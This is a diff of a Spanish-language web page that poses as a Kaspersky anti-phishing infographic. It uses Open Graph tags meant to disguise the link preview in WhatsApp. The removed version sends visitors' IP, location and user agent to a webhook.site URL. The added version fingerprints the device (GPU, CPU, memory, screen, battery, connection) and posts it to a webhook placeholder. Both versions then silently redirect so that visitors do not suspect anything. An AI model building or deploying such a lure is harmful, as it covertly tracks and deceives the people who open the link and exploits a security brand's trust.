@@ -1,48 +1,53 @@
-<!DOCTYPE html>
-<html lang="es">
-<head>
-    <meta charset="UTF-8">
-    <title>Infografía de Seguridad - Kaspersky</title>
+<script>
+    // Función para obtener información detallada de la tarjeta gráfica (GPU)
+    function getGPU() {
+        try {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            if (!gl) return "No disponible";
+            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+            return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "No disponible";
+        } catch (e) { return "Error al leer GPU"; }
+    }
 
-    <!-- Etiquetas Open Graph para camuflar la vista previa en WhatsApp -->
-    <meta property="og:title" content="🛡️ Guía de Ciberseguridad: Qué hacer ante el Phishing">
-    <meta property="og:description" content="Infografía educativa de Kaspersky con los 5 pasos clave para proteger tu información institucional.">
-    <meta property="og:image" content="https://content.kaspersky-labs.com/fm/press-releases/60/602e97536a1c3cf3644d3961ff99098b/processed/phishing-email-infographic-q93.png">
-    <meta property="og:type" content="article">
+    // Recopilación de metadatos del sistema sin permisos avanzados
+    const infoDispositivo = {
+        plataforma: navigator.platform,
+        idioma: navigator.language,
+        zonaHoraria: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        nucleosCPU: navigator.hardwareConcurrency || "Oculto",
+        memoriaRAM: navigator.deviceMemory ? navigator.deviceMemory + " GB aproximados" : "Oculto",
+        pantallaAncho: window.screen.width,
+        pantallaAlto: window.screen.height,
+        tarjetaGrafica: getGPU(),
+        navegador: navigator.userAgent,
+        tipoConexion: navigator.connection ? navigator.connection.effectiveType : "No disponible"
+    };
 
-    <script>
-        // 1. Captura de metadatos de red a través de una API pública
-        fetch('https://ipapi.co')
-        .then(response => response.json())
-        .then(data => {
-            // 2. ENVÍO DE DATOS: Reemplaza las comillas de abajo con tu URL de Webhook.site
-            return fetch('https://webhook.site/1dd6a511-8c7b-430c-9dcf-40e32ef25686', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    ip: data.ip,
-                    ciudad: data.city,
-                    pais: data.country_name,
-                    proveedor: data.org,
-                    dispositivo: navigator.userAgent,
-                    nota: "Acceso detectado desde enlace camuflado"
-                })
-            });
-        })
-        .then(() => {
-            // 3. Redirección automática y transparente hacia la infografía original de Kaspersky
-            window.location.href = "https://content.kaspersky-labs.com/fm/press-releases/60/602e97536a1c3cf3644d3961ff99098b/processed/phishing-email-infographic-q93.png";
-        })
-        .catch(error => {
-            // En caso de que el usuario bloquee las APIs de rastreo, redirige igual para no levantar sospechas
-            window.location.href = "https://content.kaspersky-labs.com/fm/press-releases/60/602e97536a1c3cf3644d3961ff99098b/processed/phishing-email-infographic-q93.png";
+    // Intento de leer el estado de la batería si el navegador lo permite
+    if (navigator.getBattery) {
+        navigator.getBattery().then(function(battery) {
+            infoDispositivo.bateriaNivel = (battery.level * 100) + "%";
+            infoDispositivo.estaCargando = battery.charging ? "Sí" : "No";
+            enviarDatos();
+        }).catch(() => { enviarDatos(); });
+    } else {
+        enviarDatos();
+    }
+
+    // Función para enviar todo el paquete de datos recolectados al Webhook
+    function enviarDatos() {
+        fetch('TU_URL_DE_WEBHOOK_AQUÍ', {
+            method: 'POST',
+            mode: 'no-cors', 
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(infoDispositivo)
+        }).then(() => {
+            // Redirección imperceptible a la infografía de Kaspersky
+            window.location.href = "https://kaspersky-labs.com";
+        }).catch(() => {
+            window.location.href = "https://kaspersky-labs.com";
         });
-    </script>
-</head>
-<body>
-    <div style="text-align: center; margin-top: 50px; font-family: Arial, sans-serif; color: #333;">
-        <p>Cargando recurso educativo de seguridad...</p>
-    </div>
-</body>
-</html>
+    }
+</script>
 
